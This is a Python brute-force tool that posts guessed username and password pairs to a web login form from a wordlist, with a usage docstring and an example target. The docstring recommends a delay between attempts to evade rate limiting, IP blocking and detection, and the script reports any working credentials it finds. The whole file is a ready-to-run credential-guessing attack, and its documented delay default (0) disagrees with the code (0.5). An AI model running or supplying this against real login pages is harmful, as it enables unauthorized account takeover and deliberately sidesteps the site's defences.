"""
Summary:
This script performs a brute-force attack on a login form by iterating through a list of usernames and passwords.

Usage:
Run the script in the terminal with the following format:
python brute_force.py <URL_FORM_LOGIN> <username1> <username2> <password_list.txt> --username_field <username_field> --password_field <password_field> -d <delay_in_seconds>

Arguments:
- <URL_FORM_LOGIN>: The URL of the login form to target.
- <username1>, <username2>, ...: List of usernames to test.
- <password_list.txt>: Path to a text file containing passwords to test.
- --username_field <username_field>: The field name for the username in the login form (default: "username").
- --password_field <password_field>: The field name for the password in the login form (default: "password").
- -d <delay_in_seconds>: Optional delay between login attempts to avoid detection (default: 0).

Example:
1. Brute force a login form at http://example.com/login using `admin` as a username:
   python brute_force.py http://example.com/login admin user.txt --username_field email --password_field pass -d 0.5

Notes:
- Replace `<URL_FORM_LOGIN>` with the target login form URL.
- Ensure the `--username_field` and `--password_field` match the field names in the HTML form.
- Use a delay (`-d`) to avoid triggering security measures such as rate limiting or IP blocking.
"""


import requests
import argparse
import time
from requests.exceptions import RequestException

def check_login(url, username, password, username_field, password_field):
    try:
        payload = {username_field: username, password_field: password}
        response = requests.post(url, data=payload, timeout=10)
        response.raise_for_status()

        # Check response for login success (customize based on your application)
        if "Login Failed" not in response.text and "Invalid User" not in response.text:
            return True, response.text
        return False, response.text

    except RequestException as e:
        return False, f"Error: {e}"

def brute_force(url, usernames, password_list, username_field, password_field, delay):
    for username in usernames:
        print(f"Trying username: {username}")
        try:
            with open(password_list, "r") as f:
                for password in f:
                    password = password.strip()
                    success, response_text = check_login(url, username, password, username_field, password_field)

                    if success:
                        print(f"[SUCCESS] Login successful with username: {username} and password: {password}")
                        return True
                    else:
                        print(f"[FAILED] Username: {username} | Password: {password}", end="\r")
                        time.sleep(delay)
        except FileNotFoundError:
            print(f"Error: Password file '{password_list}' not found.")
            return False

        print(f"\n[INFO] All combinations exhausted for username: {username}")

    return False

def main():
    parser = argparse.ArgumentParser(description="Brute Force Attack on Login Page")
    parser.add_argument("url", help="URL of the login form")
    parser.add_argument("usernames", nargs='+', help="List of usernames to brute force (space separated)")
    parser.add_argument("password_list", help="Path to the file containing passwords")
    parser.add_argument("--username_field", help="Field name for username", default="username")
    parser.add_argument("--password_field", help="Field name for password", default="password")
    parser.add_argument("-d", "--delay", type=float, help="Delay between requests in seconds", default=0.5)

    args = parser.parse_args()
    url = args.url
    usernames = args.usernames
    password_list = args.password_list
    username_field = args.username_field
    password_field = args.password_field
    delay = args.delay

    print("[INFO] Starting brute force attack...")
    if brute_force(url, usernames, password_list, username_field, password_field, delay):
        print("[SUCCESS] Brute force attack successful!")
    else:
        print("[FAILED] Brute force attack failed.")

if __name__ == "__main__":
    main()
